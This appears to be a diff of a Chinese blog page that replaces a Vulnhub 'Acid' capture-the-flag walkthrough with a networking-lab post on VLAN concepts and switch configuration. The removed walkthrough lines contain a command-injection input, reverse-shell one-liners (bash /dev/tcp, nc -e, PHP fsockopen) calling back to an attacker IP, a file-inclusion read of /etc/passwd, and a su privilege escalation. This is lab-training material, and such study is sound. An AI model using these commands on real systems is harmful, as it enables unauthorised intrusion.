@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Vulnhub,Acid,">
+  <meta name="keywords" content="计算机网络实验,VLAN,">
 
 
 
@@ -81,37 +81,18 @@
 
 
 
-<meta name="description" content="简介Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。 网址：https://www.vulnhub.com/ 本文靶机镜像下载地址：https://download.vulnhub.com/acid/Acid.rar 目标：获得root权限和flag。">
-<meta name="keywords" content="Vulnhub,Acid">
+<meta name="description" content="基本概念虚拟局域网（Virtual Local Area Network,VLAN）是一种通过将局域网内的设备逻辑的划分成一个个网段，从而实现虚拟工作组的技术。VLAN很好的解决传统网络存在的网络结构、安全性、冗余路径等诸多问题。 利用交换机可以实现VLAN，但并不是所有交换机都具有VLAN功能。">
+<meta name="keywords" content="计算机网络实验,VLAN">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Vulnhub实战之Acid">
-<meta property="og:url" content="https://sy-yunyi.github.io/2019/03/25/Vulnhub实战之Acid/index.html">
+<meta property="og:title" content="计网实验之VLAN技术">
+<meta property="og:url" content="https://sy-yunyi.github.io/2019/04/10/计网实验之VLAN技术/index.html">
 <meta property="og:site_name" content="Six&#39;s Blog">
-<meta property="og:description" content="简介Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。 网址：https://www.vulnhub.com/ 本文靶机镜像下载地址：https://download.vulnhub.com/acid/Acid.rar 目标：获得root权限和flag。">
+<meta property="og:description" content="基本概念虚拟局域网（Virtual Local Area Network,VLAN）是一种通过将局域网内的设备逻辑的划分成一个个网段，从而实现虚拟工作组的技术。VLAN很好的解决传统网络存在的网络结构、安全性、冗余路径等诸多问题。 利用交换机可以实现VLAN，但并不是所有交换机都具有VLAN功能。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c984d4d7d6b7.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c984e3d644aa.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c98501ad635f.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c98517836a5a.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c9853b33dd37.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c985f4a1eb74.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c985ffa8c6c0.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c98608830e4c.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c9861011a174.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c986472737d6.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c98655e5d788.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c98670071b8b.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c9868ed499d7.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c9869cd1122b.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c986a0753ef6.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c986afbeabf9.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c986bad78f65.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/25/5c986bdbc74b8.png">
-<meta property="og:updated_time" content="2019-03-25T05:49:50.509Z">
+<meta property="og:updated_time" content="2019-04-10T08:01:16.828Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Vulnhub实战之Acid">
-<meta name="twitter:description" content="简介Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。 网址：https://www.vulnhub.com/ 本文靶机镜像下载地址：https://download.vulnhub.com/acid/Acid.rar 目标：获得root权限和flag。">
-<meta name="twitter:image" content="https://i.loli.net/2019/03/25/5c984d4d7d6b7.png">
+<meta name="twitter:title" content="计网实验之VLAN技术">
+<meta name="twitter:description" content="基本概念虚拟局域网（Virtual Local Area Network,VLAN）是一种通过将局域网内的设备逻辑的划分成一个个网段，从而实现虚拟工作组的技术。VLAN很好的解决传统网络存在的网络结构、安全性、冗余路径等诸多问题。 利用交换机可以实现VLAN，但并不是所有交换机都具有VLAN功能。">
 
 
 
@@ -141,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://sy-yunyi.github.io/2019/03/25/Vulnhub实战之Acid/">
+  <link rel="canonical" href="https://sy-yunyi.github.io/2019/04/10/计网实验之VLAN技术/">
 
 
 
 
 
-  <title>Vulnhub实战之Acid | Six's Blog</title>
+  <title>计网实验之VLAN技术 | Six's Blog</title>
   
 
 
@@ -346,7 +327,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sy-yunyi.github.io/2019/03/25/Vulnhub实战之Acid/">
+    <link itemprop="mainEntityOfPage" href="https://sy-yunyi.github.io/2019/04/10/计网实验之VLAN技术/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Six">
@@ -363,7 +344,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Vulnhub实战之Acid</h1>
+          <h1 class="post-title" itemprop="name headline">计网实验之VLAN技术</h1>
         
 
         <div class="post-meta">
@@ -375,8 +356,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-25T00:00:00+08:00">
-                2019-03-25
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-10T00:00:00+08:00">
+                2019-04-10
               </time>
             
 
@@ -398,8 +379,8 @@
               
               
                 <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">安全笔记</span>
+                  <a href="/categories/网络实验/" itemprop="url" rel="index">
+                    <span itemprop="name">网络实验</span>
                   </a>
                 </span>
 
@@ -416,8 +397,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/03/25/Vulnhub实战之Acid/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/03/25/Vulnhub实战之Acid/" itemprop="commentCount"></span>
+                <a href="/2019/04/10/计网实验之VLAN技术/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/04/10/计网实验之VLAN技术/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -444,7 +425,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1.1k
+                  1.7k
                 </span>
               
 
@@ -460,7 +441,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  4
+                  6
                 </span>
               
             </div>
@@ -481,103 +462,120 @@
       
 
       
-        <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Vulnhub是一个开放的靶机平台，主旨是让任何人可以方便快捷的获得安全相关的实战经验。里面很多练习靶机镜像，可以用VMware或virtualBox打开，目标为获得靶机中的flag，提权。</p>
-<p>网址：<a href="https://www.vulnhub.com/" target="_blank" rel="noopener">https://www.vulnhub.com/</a></p>
-<p>本文靶机镜像下载地址：<br><a href="https://download.vulnhub.com/acid/Acid.rar" target="_blank" rel="noopener">https://download.vulnhub.com/acid/Acid.rar</a></p>
-<p>目标：获得root权限和flag。</p>
+        <h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>虚拟局域网（Virtual Local Area Network,VLAN）是一种通过将局域网内的设备逻辑的划分成一个个网段，从而实现虚拟工作组的技术。VLAN很好的解决传统网络存在的网络结构、安全性、冗余路径等诸多问题。</p>
+<p>利用交换机可以实现VLAN，但并不是所有交换机都具有VLAN功能。</p>
 <a id="more"></a>
-<h3 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01  信息收集"></a>0x01  信息收集</h3><h4 id="IP收集"><a href="#IP收集" class="headerlink" title="IP收集"></a>IP收集</h4><p>首先要确定目标主机的IP地址，运行<code>nmap</code>，进行网段扫描。</p>
-<p> <img src="https://i.loli.net/2019/03/25/5c984d4d7d6b7.png" alt="网段扫描.png"></p>
-<p>从结果中获得目标IP地址<code>192.168.175.136</code></p>
-<h4 id="目标扫描"><a href="#目标扫描" class="headerlink" title="目标扫描"></a>目标扫描</h4><p>找到目标地址后，针对目标进行扫描，包括端口扫描、服务识别等。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65535 -sV 192.168.175.136</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/03/25/5c984e3d644aa.png" alt="端口扫描.png"></p>
-<p>对结果分析，发现目标机开启了tcp33447端口，web服务器版本为Apache 2.4.10，操作系统为Ubuntu。</p>
-<p>综合以上，我们可以得到的信息有：</p>
+<p>一个VLAN组成一个逻辑子网，即一个逻辑广播域，可以覆盖多个网络设备，允许处于不同网络位置的网络用户加入到同一个逻辑子网中。IEEE与1999年颁布了用以标准化VLAN实现方案的IEEE 802.1q协议标准草案。</p>
+<p>VLAN是为来解决以太网的广播问题和安全性问题而提出的一种协议，它在以太网帧的基础上增加了VLAN首部，用VLAN ID 把用户划分为更小的工作组，限制不同工作组之间的二层访问，每个工作组就形成了一个虚拟的局域网。</p>
+<p>虚拟局域网的主要特点是可以限制广播范围，形成虚拟工作组，动态管理网络。</p>
+<p>每个VLAN都包含一组有相同需求的工作站，与物理上形成的LAN有相同的属性。但由于其是逻辑上划分而不是物理划分，所以这些工作站不一定属于同一个物理网段。</p>
+<p>一个VLAN内部的广播和单播流量都不会转发到其他VLAN中，从而有助于控制流量、减少设备投资、简化网络管理和提高网络的安全性。</p>
+<p>VLAN的特征：</p>
 <ul>
-<li>tcp33447端口开放</li>
-<li>Apache服务</li>
-<li>Ubuntu操作系统</li>
-</ul>
-<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>从获得的信息，我们可以从Apache和Ubuntu漏洞入手，一般我们重点看web漏洞。</p>
-<ul>
-<li>web挖掘思路：</li>
-</ul>
-<p>(1) 查看每个网页的源码，看是否有提示；</p>
-<p>(2) 暴破目录，用御剑或DirBuster，看是否有新网页，找新网页的漏洞；</p>
-<ul>
-<li>Apache挖掘思路：</li>
-</ul>
-<p>(1) 寻找Apache2.4.10有无已知漏洞可利用：没有发现可直接利用的漏洞。</p>
-<p>(2) 到<a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a>查询有无exp：没有找到exp。</p>
-<h4 id="Web漏洞分析"><a href="#Web漏洞分析" class="headerlink" title="Web漏洞分析"></a>Web漏洞分析</h4><p>进入目标机网页</p>
-<p><img src="https://i.loli.net/2019/03/25/5c98501ad635f.png" alt="网页.png"></p>
-<p>网页很简单，没有发现二级页面，F12查看源码。</p>
-<p>发现有注释，<code>0x643239334c6d70775a773d3d</code>,为16进制字符串，将其转换为字符串，得到<code>d293LmpwZw==</code>。</p>
-<p>对其进行base64解密，得到<code>wow.jpg</code>，一张图片名，访问尝试一下。</p>
-<p>直接访问，提示没有找到文件，可能不在同一目录，猜测目录。</p>
-<p><code>http://192.168.175.136:33447/images/wow.jpg</code></p>
-<p>得到图片</p>
-<p> <img src="https://i.loli.net/2019/03/25/5c98517836a5a.png" alt="wow.png"></p>
-<p>将图片下载至本地，先查看属性，看是否存在可用信息，未包含信息。</p>
-<p>用notepad++将图片打开，在图片最后发现<code>37:61:65:65:30:66:36:64:35:38:38:65:64:39:39:30:35:65:65:33:37:66:31:36:61:37:63:36:31:30:64:34</code>,猜测为16进制字符，将其转换为字符串。</p>
-<p>得到<code>7aee0f6d588ed9905ee37f16a7c610d4</code>，这是一串MD5，对其进行解密，得到<code>63425</code>，猜测为一个ID。</p>
-<p>在首页时，发现其标题显示为<code>\challenge</code>,可能为另一网页。</p>
-<p>访问<code>http://192.168.175.136:33447/Challenge/</code></p>
-<p><img src="https://i.loli.net/2019/03/25/5c9853b33dd37.png" alt="挑战.png"></p>
-<p>任意输入邮箱和密码显示登陆失败。利用sqlmap，尝试注入，因为请求时POST请求，所以先用burpSuite将请求文件保存下来。</p>
-<p>没有发现注入点。</p>
-<p>利用<code>dirbuster</code>进行路径爆破。</p>
-<p><img src="https://i.loli.net/2019/03/25/5c985f4a1eb74.png" alt="目录爆破.png"></p>
-<p>发现在<code>/challenge</code>下存在新的路径，<code>include.php</code>、<code>cake.php</code>、<code>hacked.php</code>.</p>
-<p>访问<code>cake.php</code>,</p>
-<p><img src="https://i.loli.net/2019/03/25/5c985ffa8c6c0.png" alt="cake.png"></p>
-<p>点击<code>login</code>，进入<code>index.php</code>，登录页，看网页标题为<code>/Magic_Box</code>。</p>
-<p>访问<code>hacked.php</code>，</p>
-<p><img src="https://i.loli.net/2019/03/25/5c98608830e4c.png" alt="hacked.png"></p>
-<p>一个添加ID的页面。任意输入一个ID，显示添加成功。</p>
-<p>访问<code>include.php</code>，</p>
-<p><img src="https://i.loli.net/2019/03/25/5c9861011a174.png" alt="include.png"></p>
-<p>一个文件包含的页面，输入<code>etc/passwd</code>,发现返回了文件内容。</p>
-<p>继续爆破<code>/Magic_Box</code>,</p>
-<p><img src="https://i.loli.net/2019/03/25/5c986472737d6.png" alt="magic.png"></p>
-<p>发现新路径<code>low.php</code>、<code>command.php</code>。</p>
-<p><code>low.php</code>为空白页面，<code>command.php</code>存在一个<code>ping</code>命令执行。尝试命令执行。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1；whoami</span><br></pre></td></tr></table></figure>
-<p>发现执行成功，</p>
-<p><img src="https://i.loli.net/2019/03/25/5c98655e5d788.png" alt="whoami.png"></p>
-<p>利用命令执行获取shell。</p>
-<p>攻击机开启<code>nc</code>监听，</p>
-<p>尝试<code>bash</code>反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.175.134/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>尝试<code>nc</code>反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash -d 192.168.175.134 4444</span><br></pre></td></tr></table></figure>
-<p>尝试PHP反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;192.168.175.134&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>
-<p>成功！</p>
-<p><img src="https://i.loli.net/2019/03/25/5c98670071b8b.png" alt="shell.png"></p>
-<p>但无法执行<code>su</code>命令，需要终端。</p>
+<li><p>不受网络物理位置的限制，可跨越多个物理网络和多台交换机。</p>
+</li>
+<li><p>可隔离广播信息，每个VLAN为一个广播域，可以有效防止广播风暴的发生。</p>
 <blockquote>
-<p>回显su: must be run from a terminal 需要一个终端</p>
+<p>如果要实现不同VLAN之间的主机通信，则必须通过一台路由器或者三层交换机实现。</p>
 </blockquote>
-<p>用python调用本地的shell,</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;import pty; pty.spawn(&apos;/bin/bash&apos;)&quot; &gt; /tmp/asdf.py</span><br><span class="line">python /tmp/asdf.py</span><br></pre></td></tr></table></figure>
-<p>成功获取终端。</p>
-<p>执行<code>cat /etc/passwd</code>，查看用户。</p>
-<p><img src="https://i.loli.net/2019/03/25/5c9868ed499d7.png" alt="etc.png"></p>
-<p>具有bash权限的用户有<code>root</code>、<code>acid</code>、<code>saman</code>.</p>
-<p>找每个用户的文件（不显示错误）</p>
-<p> <code>find / -user saman 2&gt;/dev/null</code></p>
-<p><img src="https://i.loli.net/2019/03/25/5c9869cd1122b.png" alt="saman.png"></p>
-<p> <code>find / -user acid 2&gt;/dev/null</code></p>
-<p><img src="https://i.loli.net/2019/03/25/5c986a0753ef6.png" alt="acid.png"></p>
-<p>发现一个<code>pcapng</code>文件，这是一个网络流量包文件。下载至本机进行分析。</p>
-<p>在其中一个TCP包中发现用户<code>saman</code>的密码，<code>1337hax0r</code>。</p>
-<p> <img src="https://i.loli.net/2019/03/25/5c986afbeabf9.png" alt="samanmima.png"></p>
-<p>利用<code>su</code>提权。</p>
-<p><img src="https://i.loli.net/2019/03/25/5c986bad78f65.png" alt="提权.png"></p>
-<p>获取flag。</p>
-<p><img src="https://i.loli.net/2019/03/25/5c986bdbc74b8.png" alt="flag.png"></p>
+</li>
+<li><p>可有效提升带宽，将网络上的用户按业务功能划分多个逻辑工作组，那么大部分通信交流将被限制在一个VLAN中，使带宽得到有效提升。</p>
+</li>
+<li><p>VLAN由软件实现定义和划分，建立和重组灵活。</p>
+</li>
+</ul>
+<h3 id="VLAN分类"><a href="#VLAN分类" class="headerlink" title="VLAN分类"></a>VLAN分类</h3><ol>
+<li><h4 id="基于端口划分VLAN-静态VLAN"><a href="#基于端口划分VLAN-静态VLAN" class="headerlink" title="基于端口划分VLAN  -   静态VLAN"></a>基于端口划分VLAN  -   <em>静态VLAN</em></h4><p>优点在于在定义VLAN成员时非常简单，只需将所有端口都定义为相应的VLAN即可，且适用于任何大小的网络。例如可以指定交换机1的端口1~ 6和交换机2的端口1~4端口为同一VLAN，即实现了跨越多台交换机的VLAN。</p>
+<p>缺点在于用户从一个端口迁移至另一个端口时需要重新定义。</p>
+</li>
+<li><h4 id="基于MAC地址划分VLAN-动态VLAN"><a href="#基于MAC地址划分VLAN-动态VLAN" class="headerlink" title="基于MAC地址划分VLAN  -   动态VLAN"></a>基于MAC地址划分VLAN  -   <em>动态VLAN</em></h4><p>利用MAC地址区分不用的用户，根据规则将不同的用户划分至不同的VLAN。</p>
+<p>优点在于用户物理移动不用重新配置VLAN。</p>
+<p>缺点是初始化时，所有用户都必须进行配置，如果用户较多，则配置繁琐，适用于小型的局域网。</p>
+</li>
+<li><h4 id="基于网络层协议划分VLAN-动态VLAN"><a href="#基于网络层协议划分VLAN-动态VLAN" class="headerlink" title="基于网络层协议划分VLAN  -   动态VLAN"></a>基于网络层协议划分VLAN  -   <em>动态VLAN</em></h4><p>可分为IP、IPX、AppleTalk等，根据不同的协议类型进行流量控制。</p>
+<p>优点是用户的物理位置改变时，既不需要重新配置所属VLAN，也不需要附件帧标签，可以减少网络的通信量。</p>
+<p>缺点是效率低，检查IP帧头增加了延时时间。</p>
+</li>
+<li><h4 id="根据IP组播划分VLAN-动态VLAN"><a href="#根据IP组播划分VLAN-动态VLAN" class="headerlink" title="根据IP组播划分VLAN  -   动态VLAN"></a>根据IP组播划分VLAN  -   <em>动态VLAN</em></h4><p>此方法将一个IP组播组划分为一个VLAN，主要适用于将不在同一地理范围内的局域网组成一个VLAN。</p>
+</li>
+</ol>
+<h3 id="VLAN数据帧标识"><a href="#VLAN数据帧标识" class="headerlink" title="VLAN数据帧标识"></a>VLAN数据帧标识</h3><p>最具代表性的VLAN数据帧标识方法时虚拟桥接局域网标准IEEE 802.1q。此协议定义了同一VLAN跨越交换机通信桥接的规则以及正确的标识VLAN的帧格式。IEEE 802.1q标准使用一种内部标记tag机制，该机制将标记插入到帧内，重新计算帧校验序列。每个标记包含4B，其中VPID是2B的控制信息，包含3位用户优先级，1位规范格式指示（默认为0，表示以太网）和12位的VLAN标识符。</p>
+<p>基于IEEE 802.1q标准的tagVLAN用VID划分不同的VLAN，当数据帧通过交换机时，交换机根据数据帧中的tag的VID信息，标识特面所在的VLAN，这使得所有属于该VLAN的数据帧，都被限制在该逻辑VLAN中传输。</p>
+<p>数据帧的格式如下：</p>
+<table>
+<thead>
+<tr>
+<th>前导帧</th>
+<th>隔符</th>
+<th>目的MAC地址</th>
+<th>源MAC地址</th>
+<th>类型</th>
+<th>数据部分</th>
+<th>帧检测序列</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>7B</td>
+<td>1B</td>
+<td>6B</td>
+<td>6B</td>
+<td>2B</td>
+<td>46~1500B</td>
+<td>4B</td>
+</tr>
+</tbody>
+</table>
+<p>采用IEEE 802.1q方法标识的数据帧格式如下：</p>
+<table>
+<thead>
+<tr>
+<th>前导帧</th>
+<th>隔符</th>
+<th>目的MAC地址</th>
+<th>源MAC地址</th>
+<th>VPID</th>
+<th>VCI</th>
+<th>类型</th>
+<th>数据部分</th>
+<th>帧检测序列</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>7B</td>
+<td>1B</td>
+<td>6B</td>
+<td>6B</td>
+<td>2B</td>
+<td>2B</td>
+<td>2B</td>
+<td>46~1500B</td>
+<td>4B</td>
+</tr>
+</tbody>
+</table>
+<p>以太网数据帧最大长度为1518B，加上VPID和VCI字段后长度增加至1522B。</p>
+<h3 id="VLAN中的端口"><a href="#VLAN中的端口" class="headerlink" title="VLAN中的端口"></a>VLAN中的端口</h3><p>VLAN以VLAN ID 标识，ID 的取值范围为1~4096。一台交换机最多支持250个VLAN，其中，VLAN 1 是出厂默认设置的VLAN，如果不另行配置，所有交换机连接的设备都是VLAN1。VLAN1是不可删除的VLAN。</p>
+<p>VLAN端口分为两种：Access端口和Trunk端口。</p>
+<p><strong>Access端口</strong>只能属于一个VLAN，并且可以通过手工设置指定VLAN。此端口既不能直接从另一个VLAN接收信息，也不能像其他VLAN发送信息，只能传输属于此VLAN的帧。</p>
+<p><strong>Trunk端口</strong>默认属于本交换机所有VLAN，通常位于交换机之间的来连接，以保证在跨越多台交换机上建立的同一个VLAN的成员可以通信。交换机之间互连用的即为Trunk端口，可以承载带VLAN和不带VLAN的报文。</p>
+<p>交换机的Trunk端口不属于某个VLAN，而是承载所有VLAN的帧，帧的格式是IEEE 802.1q。Trunk端口基于OSI第二层。</p>
+<h3 id="VLAN基本配置"><a href="#VLAN基本配置" class="headerlink" title="VLAN基本配置"></a>VLAN基本配置</h3><p>基于端口的VLAN配置包括两步：建立VLAN和配置VLAN端口。</p>
+<h4 id="建立和修改VLAN"><a href="#建立和修改VLAN" class="headerlink" title="建立和修改VLAN"></a>建立和修改VLAN</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vlan valn-id</span><br></pre></td></tr></table></figure>
+<p>vlan_id为输入的VLAN ID ，范围为1~4096。如果输入为新的vlan-id，则会创建VLAN；如果是已经存在的则修改VLAN。</p>
+<p>这条命令执行于全局配置模式下[^若不了解全局配置，可看前一篇文章]，是进入VLAN配置模式的导航命令。</p>
+<h4 id="删除VLAN"><a href="#删除VLAN" class="headerlink" title="删除VLAN"></a>删除VLAN</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">no vlan vlan-id</span><br></pre></td></tr></table></figure>
+<h4 id="将Access端口分配给VLAN"><a href="#将Access端口分配给VLAN" class="headerlink" title="将Access端口分配给VLAN"></a>将Access端口分配给VLAN</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">switchport access vlan vlan-id</span><br></pre></td></tr></table></figure>
+<p>VLAN不存在则先创建VLAN。</p>
+<blockquote>
+<p>将交换机端口0/5指定到VLAN  10</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span> Switch(config) interface gigabiternet 0/5</span><br><span class="line"><span class="meta">&gt;</span> Switch(config-if) switchport access vlan 10</span><br><span class="line"><span class="meta">&gt;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="将端口移除"><a href="#将端口移除" class="headerlink" title="将端口移除"></a>将端口移除</h4><blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; Switch(config) interface gigabiternet 0/5</span><br><span class="line">&gt; Switch(config-if) switchport trunk allowed vlan remove 2</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h4 id="显示VLAN信息"><a href="#显示VLAN信息" class="headerlink" title="显示VLAN信息"></a>显示VLAN信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show vlan</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -595,9 +593,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Vulnhub/" rel="tag"><i class="fa fa-tag"></i> Vulnhub</a>
+            <a href="/tags/计算机网络实验/" rel="tag"><i class="fa fa-tag"></i> 计算机网络实验</a>
           
-            <a href="/tags/Acid/" rel="tag"><i class="fa fa-tag"></i> Acid</a>
+            <a href="/tags/VLAN/" rel="tag"><i class="fa fa-tag"></i> VLAN</a>
           
         </div>
       
@@ -610,8 +608,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/24/编译器一些闲话-gcc、clang、llvm/" rel="next" title="编译器一些闲话-gcc/clang/llvm/..">
-                <i class="fa fa-chevron-left"></i> 编译器一些闲话-gcc/clang/llvm/..
+              <a href="/2019/04/03/计网实验之交换机技术/" rel="next" title="计网实验之交换机技术">
+                <i class="fa fa-chevron-left"></i> 计网实验之交换机技术
               </a>
             
           </div>
@@ -619,10 +617,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/26/渗透技术基础之Windows提权/" rel="prev" title="渗透技术基础之Windows提权">
-                渗透技术基础之Windows提权 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -780,7 +774,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#简介"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-信息收集"><span class="nav-number">2.</span> <span class="nav-text">0x01  信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IP收集"><span class="nav-number">2.1.</span> <span class="nav-text">IP收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#目标扫描"><span class="nav-number">2.2.</span> <span class="nav-text">目标扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Web漏洞分析"><span class="nav-number">3.1.</span> <span class="nav-text">Web漏洞分析</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本概念"><span class="nav-number">1.</span> <span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VLAN分类"><span class="nav-number">2.</span> <span class="nav-text">VLAN分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基于端口划分VLAN-静态VLAN"><span class="nav-number">2.1.</span> <span class="nav-text">基于端口划分VLAN  -   静态VLAN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于MAC地址划分VLAN-动态VLAN"><span class="nav-number">2.2.</span> <span class="nav-text">基于MAC地址划分VLAN  -   动态VLAN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于网络层协议划分VLAN-动态VLAN"><span class="nav-number">2.3.</span> <span class="nav-text">基于网络层协议划分VLAN  -   动态VLAN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#根据IP组播划分VLAN-动态VLAN"><span class="nav-number">2.4.</span> <span class="nav-text">根据IP组播划分VLAN  -   动态VLAN</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VLAN数据帧标识"><span class="nav-number">3.</span> <span class="nav-text">VLAN数据帧标识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VLAN中的端口"><span class="nav-number">4.</span> <span class="nav-text">VLAN中的端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VLAN基本配置"><span class="nav-number">5.</span> <span class="nav-text">VLAN基本配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#建立和修改VLAN"><span class="nav-number">5.1.</span> <span class="nav-text">建立和修改VLAN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#删除VLAN"><span class="nav-number">5.2.</span> <span class="nav-text">删除VLAN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#将Access端口分配给VLAN"><span class="nav-number">5.3.</span> <span class="nav-text">将Access端口分配给VLAN</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#将端口移除"><span class="nav-number">5.4.</span> <span class="nav-text">将端口移除</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#显示VLAN信息"><span class="nav-number">5.5.</span> <span class="nav-text">显示VLAN信息</span></a></li></ol></li></ol></div>
             
 
           </div>
